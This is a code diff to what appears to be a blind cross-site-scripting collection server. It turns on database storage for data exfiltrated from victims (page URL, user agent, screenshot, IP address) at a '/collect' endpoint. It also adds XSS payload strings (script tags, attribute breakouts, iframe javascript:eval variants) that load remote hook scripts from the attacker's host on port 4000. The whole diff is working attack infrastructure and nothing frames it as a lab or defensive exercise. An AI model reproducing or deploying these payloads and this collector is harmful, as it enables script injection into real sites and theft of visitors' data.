@@ -103,10 +103,10 @@ app.post('/collect', (req, res) => {
 
   //Debugging output
   console.log('[+] Payload received:', req.body);
-  // db.run(
-  //   `INSERT INTO payloads (url, userAgent, screenshot, ip, time) VALUES (?, ?, ?, ?, ?)`,
-  //   [url, userAgent || ua, screenshot || null, ip, time]
-  // );
+  db.run(
+    `INSERT INTO payloads (url, userAgent, screenshot, ip, time) VALUES (?, ?, ?, ?, ?)`,
+    [url, userAgent || ua, screenshot || null, ip, time]
+  );
 
   res.sendStatus(200);
 });
@@ -124,10 +124,13 @@ app.get('/payloads', checkPin, (req, res) => {
   const payloadBase = `<script src="http://${host}:4000/js/hook2.js"></script>`;
   const payloads = [
     payloadBase,
+    `<script src="http://${host}:4000/js/hook3.js"></script>`, 
     `<img src=x onerror="${payloadBase}">`,
     `"><script src="http://${host}:4000/js/hook2.js"></script>`,
     `<iframe src="javascript:eval('<script src=\\'http://${host}:4000/js/hook2.js\\'><\\/script>')">`,
-    `<body onload="${payloadBase}">`
+    `<body onload="${payloadBase}">`,
+    `"><script src="http://${host}:4000/js/hook3.js"></script>`,
+    `<iframe src="javascript:eval('<script src=\\'http://${host}:4000/js/hook3.js\\'><\\/script>')">`,
   ];
   res.render('payloads', { payloads });
 });
